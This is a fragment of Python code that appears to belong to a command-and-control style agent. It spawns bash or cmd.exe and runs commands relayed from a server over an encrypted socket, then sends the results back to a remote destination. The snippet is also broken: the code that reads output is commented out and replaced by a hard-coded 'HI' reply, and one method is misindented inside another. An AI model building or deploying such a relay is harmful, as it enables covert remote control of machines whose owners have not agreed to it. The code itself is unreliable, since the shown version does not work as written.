   def shell_handle(self,data:dict):
     shell=None
     marker='__CMD_FIN__'
     chann_id=data['id']
     cmd_raw=data['cmd']
     src=data['src']
     if cmd_raw=='EXIT':
      return self.terminate_shell(chann_id,data['dst'])
     command = f"{cmd_raw}; echo {marker}"
     for channel in self.shell_channels:
       if channel['id']==chann_id:
        shell=channel['process']
        break
     shell.stdin.write(command)
     shell.stdin.flush()
     stdout_lines=[]
     stderr_lines=[]
    
    #  sel=selectors.DefaultSelector()
    #  sel.register(shell.stdout,selectors.EVENT_READ) 
    #  try:
    #     stdout_done=False
    #     while not stdout_done:
    #         events = sel.select(timeout=1)
    #         for key, _ in events:
    #             stream = key.fileobj
    #             line = stream.readline()
    #             if not line:
    #                 continue                
    #             if stream is shell.stdout:
    #                 if marker in line:
    #                     stdout_done = True
    #                 else:
    #                     stdout_lines.append(line)
    #  finally:
    #     sel.close()

    #  ssh_return=''.join(stdout_lines)  
     ssh_return='HI'
     self.sk.sendall(self.craft({
      'type':'SHELL_SESSION',
      'dir':'<--',
      'stdout':ssh_return,
      #src isset by server
      'id':chann_id,
      'dst':src
    },self.crypto_key))
     def register_shell(self,data):
        system=platform.system().lower()
        shell_process=''
        if system in ('linux','darwin','macos'):
         shell_process='/bin/bash'
        elif system in ('windows'):
         shell_process='cmd.exe'
        channel_config={
        'id':data['connector'],
        'process':subprocess.Popen(
            shell_process,
            text=True,
            shell=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            bufsize=1
        )
        }
        self.shell_channels.append(channel_config)
        return 0
     


